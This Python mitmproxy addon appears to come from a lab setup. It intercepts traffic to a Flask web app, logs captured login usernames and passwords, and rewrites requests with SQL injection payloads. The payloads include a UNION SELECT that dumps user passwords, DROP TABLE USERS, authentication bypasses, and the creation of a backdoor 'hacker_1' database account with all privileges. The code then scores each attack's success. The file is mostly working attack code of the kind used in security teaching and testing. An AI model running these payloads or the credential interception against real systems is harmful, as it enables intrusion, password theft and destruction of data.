import json
from datetime import datetime
from urllib.parse import quote

from mitmproxy import http

# Output artifact files are mounted to artifacts/release on the host by Docker.

'''flows.jsonl:
   Records every proxied request/response that mitmproxy sees.

  security_events.jsonl:
     Records only security-relevant events:
           - captured login credentials
           - SQL injection attempts'''

FLOW_LOG = "/artifacts/flows.jsonl"
SECURITY_EVENTS_LOG = "/artifacts/security_events.jsonl"


''' SQL injection test cases:
- The victim sends normal-looking requests.
- This addon replaces selected request fields with one payload at a time.'''


# Replace all YOUR_* placeholders with payloads you already tested.
# Use only values based on your seeded init.sql data.


# attack_goal meanings:
#   credential_capture  -> used for login credential capture events
#   data_exfiltration  -> SQLi attempts that return database data
#   data_modification  -> SQLi attempts that modify database data
#   access_bypass      -> SQLi attempts that bypass authentication


# expected_statuses:
#   HTTP response codes that count as expected for that test.

# success_body_markers:
#   Strings that should appear in the response body when the attack works.
TEST_CASES = {
    

    "/update_company": [
        {
            "name": "update_company_payload_1",
            "attack_goal": "data_modification",
            "fields": {
                "new_company": "HackerTransport LLC' WHERE company = 'BlueWave Logistics'#",
            },
            "expected_statuses": [200, 201],
            "success_body_markers": ["Update successful", "success"],
        },
        {
            "name": "update_company_payload_2",
            "attack_goal": "data_modification",
            "fields": {
                "new_company": "HackerFreight LLC' WHERE company = 'Oceanic Freight';CREATE TABLE hackers_table (id INT PRIMARY KEY, hacker_name VARCHAR(50));#",
            },
            "expected_statuses": [200, 201],
            "success_body_markers": ["Update successful", "success"],
        },
    ],

    "/find_company_drivers": [
        {
            "name": "find_company_payload_1",
            "attack_goal": "data_exfiltration",
            "path_payload": "Oceanic Freight' UNION SELECT username, address, password, firstname, lastname FROM USERS;#",
            "expected_statuses": [200],
            "success_body_markers": ["License Number", "Phone Number", "Address", "Name", "User found"],
        },
        {
            "name": "find_company_payload_2",
            "attack_goal": "data_modification",
            "path_payload": "HackerFreight LLC';CREATE USER 'hacker_1'@'%' IDENTIFIED BY 'youwerepwnd';SET @db_name = DATABASE();SET @sql_query = CONCAT('GRANT ALL PRIVILEGES ON ', @db_name, '.* TO ''hacker_1''@''%''');PREPARE stmt FROM @sql_query;EXECUTE stmt;DEALLOCATE PREPARE stmt#",
            "expected_statuses": [200],
            "success_body_markers": [],
        },
    ],

    "/search": [
        {
            "name": "search_payload_1",
            "attack_goal": "data_exfiltration",
            "fields": {
                "firstName": "",
                "lastName": "' OR '1' = '1",
            },
            "expected_statuses": [200,302],
            "success_body_markers": ["License Number", "Phone Number"],
        },
        {
            "name": "search_payload_2",
            "attack_goal": "data_modification",
            "fields": {
                "firstName": "",
                "lastName": "';DROP TABLE USERS#",
            },
            "expected_statuses": [404],
            "success_body_markers": ['"message": "Person not Found"','"status": "Fail"', "Person not Found", "Fail"],
        },
    ],
    "/login": [
    {
        "name": "login_bypass_payload_1",
        "attack_goal": "access_bypass",
        "fields": {
            "username": "",
            "password": "admin' OR '1'='1'#",
        },
        "expected_statuses": [302,200],
        "success_body_markers": ["Redirecting", "dashboard"],
    },
    {
        "name": "login_bypass_payload_1",
        "attack_goal": "access_bypass",
        "fields": {
            "username": "admin';#",
            "password": "",
        },
        "expected_statuses": [302,200],
        "success_body_markers": ["Redirecting", "dashboard"],
    },
],
}


# Tracks which payload should be used next for each endpoint.
TEST_INDEX = {endpoint: 0 for endpoint in TEST_CASES}

# Example:
#   First /search request gets search_payload_1.
#   Second /search request gets search_payload_2.
#   Third /search request cycles back to search_payload_1.



def utc_now() -> str:
    """Return a UTC timestamp for log records."""
    return datetime.utcnow().isoformat() + "Z"


def write_jsonl(path: str, record: dict) -> None:
    """Append one JSON object as one line to a JSONL artifact file."""
    with open(path, "a", encoding="utf-8") as f:
        f.write(json.dumps(record) + "\n")


def response_text(flow: http.HTTPFlow) -> str:
    """
    Safely read the HTTP response body as text.

    Used to check whether response body markers appear,
    such as "License Number" or "Update successful".
    """
    if not flow.response:
        return ""

    try:
        return flow.response.get_text(strict=False) or ""
    except Exception:
        return ""


def next_test_case(endpoint: str):
    """
    Return the next test case for an endpoint.

    This lets one endpoint be tested multiple times with different payloads.
    """
    cases = TEST_CASES.get(endpoint, [])

    if not cases:
        return None, None

    index = TEST_INDEX[endpoint]
    case = cases[index % len(cases)]

    # Increment so the next request to this endpoint gets the next payload.
    TEST_INDEX[endpoint] = index + 1

    # test_number is 1-based for easier reading in reports.
    return index + 1, case


def mark_sqli_attempt(flow: http.HTTPFlow, endpoint: str, test_number: int, test_case: dict) -> None:
    """
    Store SQLi test metadata on the mitmproxy flow.

    flow.metadata travels with the request and is available again when
    the response comes back.
    """
    flow.metadata["event_type"] = "sqli_attempt"
    flow.metadata["sqli_modified"] = True
    flow.metadata["sqli_endpoint"] = endpoint
    flow.metadata["sqli_test_number"] = test_number
    flow.metadata["sqli_test_name"] = test_case.get("name")
    flow.metadata["attack_goal"] = test_case.get("attack_goal")
    flow.metadata["expected_statuses"] = test_case.get("expected_statuses", [])
    flow.metadata["success_body_markers"] = test_case.get("success_body_markers", [])


def record_change(flow: http.HTTPFlow, field: str, original: str, modified: str) -> None:
    """
    Record exactly what the attacker changed.

    This is useful evidence for the report:
    victim sent original value, mitmproxy replaced it with modified value.
    """
    changes = flow.metadata.setdefault("sqli_changes", [])

    changes.append({
        "field": field,
        "original": original,
        "modified": modified,
    })


def inject_form_fields(flow: http.HTTPFlow, endpoint: str) -> None:
    """
    Replace POST form fields with the next payload for that endpoint.

    Used for:
      POST /search
      POST /update_company
    """
    test_number, test_case = next_test_case(endpoint)

    if not test_case:
        return

    mark_sqli_attempt(flow, endpoint, test_number, test_case)

    for field, payload in test_case["fields"].items():
        original = flow.request.urlencoded_form.get(field, "")

        # This is the actual request manipulation.
        flow.request.urlencoded_form[field] = payload

        record_change(flow, field, original, payload)


def inject_find_company_path(flow: http.HTTPFlow) -> None:
    """
    Replace the company name in:
      GET /find_company_drivers/<company>

    Because this endpoint takes data through the URL path, the payload must
    be URL-encoded before being placed into the path.
    """
    endpoint = "/find_company_drivers"

    test_number, test_case = next_test_case(endpoint)

    if not test_case:
        return

    original_path = flow.request.path
    payload = test_case["path_payload"]

    # URL-encode the payload so special characters survive inside the URL.
    encoded_payload = quote(payload, safe="")

    # This is the actual path manipulation.
    flow.request.path = "/find_company_drivers/" + encoded_payload

    mark_sqli_attempt(flow, endpoint, test_number, test_case)
    record_change(flow, "company_path", original_path, flow.request.path)


def capture_credentials(flow: http.HTTPFlow) -> None:
    """
    Record credentials visible in a login request.

    This does not alter the login request. It only proves that mitmproxy
    can read the username/password fields passing through the attacker.
    """
    username = flow.request.urlencoded_form.get("username", "")
    password = flow.request.urlencoded_form.get("password", "")

    captured = bool(username and password)

    flow.metadata["event_type"] = "credential_capture"
    flow.metadata["credential_capture"] = {
        "username": username,
        "password": password,
        "username_seen": bool(username),
        "password_seen": bool(password),
        "captured_credentials": captured,
    }


def request(flow: http.HTTPFlow) -> None:
    """
    mitmproxy request hook.

    Runs before the request reaches the Flask webapp.
    This is where credential capture and SQLi request manipulation happen.
    """
    # prevents unrelated traffic from being modified.
    if flow.request.host != "web":
        return
    
    if flow.request.headers.get("X-No-SQLI", "") == "1":
        return

    method = flow.request.method
    path = flow.request.path

    # Credential interception metric:
    # Count readable credentials on POST /login.
    # Do not modify this request, because normal login should still work.
    if method == "POST" and path == "/login":
        capture_credentials(flow)
        return

    # SQLi target: data exfiltration through user search.
    if method == "POST" and path == "/search":
        inject_form_fields(flow, "/search")
        return

    # SQLi target: data modification through company update.
    if method == "POST" and path == "/update_company":
        inject_form_fields(flow, "/update_company")
        return

    # SQLi target: data exfiltration through company-driver lookup.
    if method == "GET" and path.startswith("/find_company_drivers/"):
        inject_find_company_path(flow)
        return


def evaluate_sqli_success(flow: http.HTTPFlow) -> bool:
    """
    Decide whether a SQLi attempt should count as successful.

    This implementation uses HTTP-level and response-body evidence:
      1. The request was modified by mitmproxy.
      2. The response status code was expected.
      3. At least one expected marker appeared in the response body.

    """
    if not flow.metadata.get("sqli_modified", False):
        return False

    status_code = flow.response.status_code if flow.response else None
    expected_statuses = flow.metadata.get("expected_statuses", [])

    if status_code not in expected_statuses:
        return False

    body = response_text(flow)
    markers = flow.metadata.get("success_body_markers", [])

    # If markers are configured, require at least one marker in the response.
    if markers:
        return any(marker in body for marker in markers)

    # If no markers are configured, status code alone decides success.
    return True


def response(flow: http.HTTPFlow) -> None:
    """
    mitmproxy response hook.

    Runs after the Flask webapp responds.
    This records:
      - all flows
      - credential capture events
      - SQLi success/failure events
    """
    status_code = flow.response.status_code if flow.response else None

    # General flow log record.
    base_record = {
        "timestamp": utc_now(),
        "method": flow.request.method,
        "url": flow.request.pretty_url,
        "host": flow.request.host,
        "path": flow.request.path,
        "status_code": status_code,
        "event_type": flow.metadata.get("event_type"),
        "sqli_modified": flow.metadata.get("sqli_modified", False),
        "sqli_endpoint": flow.metadata.get("sqli_endpoint"),
        "sqli_test_number": flow.metadata.get("sqli_test_number"),
        "sqli_test_name": flow.metadata.get("sqli_test_name"),
        "attack_goal": flow.metadata.get("attack_goal"),
        "sqli_changes": flow.metadata.get("sqli_changes", []),
    }

    write_jsonl(FLOW_LOG, base_record)

    event_type = flow.metadata.get("event_type")

    # Security event: credential interception.
    if event_type == "credential_capture":
        credential_data = flow.metadata.get("credential_capture", {})

        event = {
            "timestamp": utc_now(),
            "event_type": "credential_capture",
            "method": flow.request.method,
            "path": flow.request.path,
            "status_code": status_code,
            "username": credential_data.get("username"),
            "password": credential_data.get("password"),
            "username_seen": credential_data.get("username_seen", False),
            "password_seen": credential_data.get("password_seen", False),
            "captured_credentials": credential_data.get("captured_credentials", False),
        }

        write_jsonl(SECURITY_EVENTS_LOG, event)

    # Security event: SQL injection attempt.
    elif event_type == "sqli_attempt":
        success = evaluate_sqli_success(flow)

        event = {
            "timestamp": utc_now(),
            "event_type": "sqli_attempt",
            "method": flow.request.method,
            "path": flow.request.path,
            "status_code": status_code,
            "endpoint": flow.metadata.get("sqli_endpoint"),
            "test_number": flow.metadata.get("sqli_test_number"),
            "test_name": flow.metadata.get("sqli_test_name"),
            "attack_goal": flow.metadata.get("attack_goal"),
            "success": success,
            "changes": flow.metadata.get("sqli_changes", []),
        }

        write_jsonl(SECURITY_EVENTS_LOG, event)